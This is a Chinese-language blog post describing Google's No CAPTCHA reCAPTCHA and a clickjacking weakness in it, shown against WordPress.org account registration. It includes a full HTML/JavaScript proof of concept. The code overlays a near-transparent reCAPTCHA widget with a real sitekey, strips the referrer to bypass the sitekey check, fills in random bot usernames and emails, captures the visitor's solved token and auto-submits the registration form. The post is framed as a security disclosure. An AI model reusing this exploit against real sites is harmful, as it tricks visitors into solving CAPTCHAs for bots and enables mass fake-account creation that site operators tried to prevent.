---
layout: post
title: The security risk of "Google reCAPTCHA"
---

#### reCAPTCHA ([Index](http://www.google.com/recaptcha/intro/))

> Google在2014.12.03发表了一篇文章 《[Are you a robot? Introducing “No CAPTCHA reCAPTCHA”](http://googleonlinesecurity.blogspot.hk/2014/12/are-you-robot-introducing-no-captcha.html)》

文章开始讲述传统验证码的方式令“真正人类”头疼，且研究表明现在的人工智能技术已经能够解决99.8%的验证码，因此扭曲的文本验证方式可能不在是一个可靠的方法。

![gg_old_captcha](/images/gg_old_captcha.jpg)

- 头疼的验证码输入
- 不可靠的文字验证码

所以不少的社区论坛使用人工识别图片选择文字答案作为验证码的方式来代替传统的验证码。

随后Google推出了**```reCAPTCHA```**项目。

![demo](/images/Recaptcha_anchorxxxxxx2x.gif)

    reCAPTCHA被gg称作没有验证码的验证码（"No CAPTCHA reCAPTCHA"），
    他让用户只需要简单的勾选就可以确认你是真实用户而非恶意机器人，操作非常简单。

#### 非单一验证
Vinay Shet或者reCAPTCHA团队也考虑到这种判断方法可能会存在误报情况，所以将验证方式进行了稳固。

 1. 传统验证码并未消失，还是会有提示输入传统验证码的方法来检测：
 ![gg_old_captcha](/images/CAPTCHA_dsahkdhkusa213dsza7i21n.png)
 
 2. 展示一张图片，让用户选择他们下面提供的图片中哪张是符合图片的：
 ![gg_old_captcha](/images/turkey_captcha2.png)
 3. 好人/坏人的判断算法
 

reCAPTCHA并未详细的说明这个新的验证码API算法的具体情况，但其中好人坏人的判断方式应该最为复杂，或基于session/cookie？

> As more websites adopt the new API, more people will see "No CAPTCHA reCAPTCHAs".  Early adopters, like Snapchat, WordPress, Humble Bundle, and several others are already seeing great results with this new API. For example, in the last week, more than 60% of WordPress’ traffic and more than 80% of Humble Bundle’s traffic on reCAPTCHA encountered the No CAPTCHA experience—users got to these sites faster. To adopt the new reCAPTCHA for your website, visit our site to learn more.

文章的最后说越来越多的网站开始使用这个新的API，例如：Snapchat, WordPress, Humble Bundle等等，也推荐大家开始使用这个reCAPTCHA项目。

#### ClickJacking

当我看完这篇文章时非常激动，因为我们再也不需要为复杂或恶心的验证码所头疼了，但之后我发现reCAPTCHA可能存在ClickJacking这种攻击类型的安全隐患，其中我们以Wordpress官方站点为例。

 - [Wordpress官方站点注册用户](https://wordpress.org/support/register.php)

其中仅仅是帐号以及邮箱是必须的，然后勾选reCAPTCHA所提供的验证码即可完成注册。

 - [ClickJacking点击劫持攻击注册](http://1.hackersoul.sinaapp.com/payload/no_captcha_clickjacking.html)

![demo_1](/images/69DFB6AC-8075-4F45-AA00-031E6F0F084E.png)

等待过后你将跳转到注册成功的页面：

![demo_2](/images/1A61E266-8B1B-4BF1-813A-536B6FB09B7B.png)

{% highlight html %}
其中测试在古董浏览器上是无法正常进行的，另外需要提一下页面中需要添加
<meta name="referrer" content="never">
来绕过他禁止对第三方数据提供sitekey的防御。
{% endhighlight %}

> 需要注意的是，reCAPTCHA会在一段时间停滞不操作页面的情况下摧毁Session：
> 
![alert_session](/images/AEAA2D26-2AA0-4AA4-9BF7-1E8071A06F53.png)

#### POC

{% highlight bash %}
<html>
    <head>
        <title>No_CAPTCHA ClickJacking demo</title>
        <meta name="referrer" content="never">
		<script type='text/javascript' src='https://www.google.com/recaptcha/api.js?ver=2'></script>
	</head>
    <body>
    <form method="post" action="https://wordpress.org/support/register.php">
    <div style="opacity:0.1" class="g-recaptcha" data-sitekey="6Ld6gcoSAAAAAEkCxPeS-_sqEokNIHwNCOtx17xo"></div>
    <input name="user_login" type="hidden" id="user_login" size="30" maxlength="30" value="" />
    <input name="user_email" id="user_email" type="hidden" value="" />
    </form>  
	半透明为了更好的展示，点击测试攻击。
    <script>
        function makeid()
        {
            var text = "";
            var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        
            for( var i=0; i < 7; i++ )
                text += possible.charAt(Math.floor(Math.random() * possible.length));
        
            return text;
        }
        user_login.value='BOT-'+makeid();
        user_email.value='BOT-'+makeid()+'@gmail.com';
        
        check = setInterval(function(){
          v=document.getElementById('g-recaptcha-response').value
          if(v.length>0){
            alert('Thanks for helping my bot! Your token is '+v);
            document.forms[0].submit();
            clearInterval(check);
          }
        },400)
    </script>
    </body>
</html>
{% endhighlight %}

#### 最后

google reCAPTCHA引进了一个非常NICE的验证码方式，在未来也同样可能有着跨时代的意义，但引入新模式的同时终会出现不可预料的问题，也许很多，很多。
 
 * 部分文献参考
    - [http://googleonlinesecurity.blogspot.hk/2014/12/are-you-robot-introducing-no-captcha.html](http://googleonlinesecurity.blogspot.hk/2014/12/are-you-robot-introducing-no-captcha.html)
    - [http://homakov.github.io/nocaptcha.html](http://homakov.github.io/nocaptcha.html)
    - [http://www.bbc.com/news/blogs-magazine-monitor-30326350](http://www.bbc.com/news/blogs-magazine-monitor-30326350)